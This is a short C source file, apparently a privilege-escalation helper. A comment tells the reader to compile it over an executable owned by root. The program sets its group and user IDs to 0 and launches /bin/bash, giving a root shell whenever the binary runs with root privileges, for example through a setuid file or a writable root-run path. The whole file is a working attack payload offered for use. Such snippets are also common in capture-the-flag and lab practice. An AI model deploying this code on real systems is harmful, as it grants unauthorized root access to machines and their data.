/*comepile over executable owned by root
gcc root-bash-shell.c -o file-owned-by-root*/
#include <unistd.h>
#include <stdlib.h>

int main() {
    setgid(0); // Set group ID to 0 (root)
    setuid(0); // Set user ID to 0 (root)
    system("/bin/bash"); // Execute a new Bash shell
    return 0; // Indicate successful execution
}
